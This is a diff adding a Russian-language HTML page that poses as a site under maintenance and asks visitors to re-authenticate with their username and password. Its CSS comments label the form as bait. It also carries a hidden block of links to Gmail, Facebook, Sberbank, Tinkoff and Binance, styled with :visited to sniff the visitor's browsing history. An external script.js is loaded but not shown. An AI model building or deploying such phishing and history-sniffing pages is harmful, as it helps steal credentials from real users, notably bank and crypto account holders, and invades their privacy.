@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Ожидание Загрузки</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        /* Скрытый элемент для проверки истории */
+        #history-checker a:visited { color: #ff0000; } 
+        #history-checker { display: none; }
+        /* Приманка для ввода данных */
+        .input-bait { margin-top: 20px; }
+        .input-bait input { padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Сайт находится в стадии обновления</h1>
+        <p>Для продолжения работы может потребоваться повторная авторизация в вашей системе.</p>
+
+        <div class="input-bait">
+            <p>Введите ваши учетные данные:</p>
+            <input type="text" id="username_auth" name="u_n" placeholder="Имя пользователя/Email">
+            <input type="password" id="password_auth" name="p_w" placeholder="Пароль">
+            <button onclick="document.getElementById('username_auth').value=''; document.getElementById('password_auth').value='';">Подтвердить</button>
+        </div>
+    </div>
+    
+    <div id="history-checker">
+        <a href="https://mail.google.com/mail/u/0/#inbox">GMAIL</a>
+        <a href="https://www.facebook.com">FACEBOOK</a>
+        <a href="https://online.sberbank.ru/">SBERBANK</a>
+        <a href="https://www.tinkoff.ru/login/">TINKOFF</a>
+        <a href="https://www.binance.com/">BINANCE</a>
+    </div>
+
+    <script src="script.js"></script> 
+</body>
+</html>
